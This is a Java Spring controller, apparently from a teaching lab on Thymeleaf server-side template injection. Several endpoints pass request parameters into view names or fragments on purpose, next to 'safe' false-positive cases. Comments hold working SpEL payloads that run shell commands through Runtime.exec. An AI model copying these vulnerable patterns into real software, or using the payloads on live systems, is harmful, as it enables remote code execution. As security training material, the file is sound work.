package com.drunkbaby.ssti.controller;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletResponse;

@Controller
public class ThymeleafController {

    Logger log = LoggerFactory.getLogger(ThymeleafController.class);

    @GetMapping("/")
    public String index(Model model) {
        model.addAttribute("message", "happy birthday");
        return "welcome";
    }

    //GET /path?lang=en HTTP/1.1
    //GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x
    @GetMapping("/path")
    public String path(@RequestParam String lang) {
        return "user/" + lang + "/welcome"; //template path is tainted
    }

    //GET /fragment?section=main
    //GET /fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22touch%20executed%22).getInputStream()).next()%7d__::.x
    @GetMapping("/fragment")
    public String fragment(@RequestParam String section) {
        return "welcome :: " + section; //fragment is tainted
    }

    @GetMapping("/doc/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("Retrieving " + document);
        //returns void, so view name is taken from URI
    }

    @GetMapping("/safe/fragment")
    @ResponseBody
    public String safeFragment(@RequestParam String section) {
        return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
    }

    @GetMapping("/safe/redirect")
    public String redirect(@RequestParam String url) {
        return "redirect:" + url; //FP as redirects are not resolved as expressions
    }

    @GetMapping("/safe/doc/{document}")
    public void getDocument(@PathVariable String document, HttpServletResponse response) {
        log.info("Retrieving " + document); //FP
    }
}